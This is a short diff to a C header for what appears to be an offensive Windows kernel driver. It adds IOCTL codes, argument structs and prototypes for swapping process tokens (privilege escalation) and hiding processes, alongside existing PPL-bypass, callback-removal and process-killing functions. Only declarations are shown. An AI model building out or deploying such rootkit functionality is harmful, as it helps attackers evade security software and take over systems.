@@ -34,6 +34,8 @@
 #define IOCTL_REM_OBJ_CALLBACK CTL_CODE_HIDE(10)
 #define IOCTL_CRASH_PROCESS CTL_CODE_HIDE(11)
 #define IOCTL_PPL_BYPASS CTL_CODE_HIDE(12)
+#define IOCTL_PROC_TOKEN_SWAP CTL_CODE_HIDE(13)
+#define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
 
 
 
@@ -122,6 +124,19 @@ struct pplData {
     DWORD offset;
 };
 
+struct elevateProcArgs {
+    DWORD pid1;
+    DWORD pid2;
+    int offset;
+};
+
+struct hideProcArgs {
+    DWORD pid;
+    int offset;
+};
+
+
+
 
 ModulesData* EnumRegisteredDrivers(UINT64);
 UINT64 FindProcNotifyRoutineAddress(UINT64, NOTIFY_ROUTINE_TYPE);
@@ -137,11 +152,11 @@ NTSTATUS DeleteRegCallbackEntry(ULONG64);
 NTSTATUS RemObjCallbackNotifyRoutineAddress();
 
 NTSTATUS pplBypass(UINT64, int);
-
+NTSTATUS procTokenSwap(DWORD, DWORD, int);
 
 NTSTATUS TermProcess(ULONG_PTR);
 NTSTATUS crashProcess(ULONG_PTR);
-
+NTSTATUS procHiding(DWORD, int);
 
 #ifndef SystemModuleInformation
 #define SystemModuleInformation 0xB
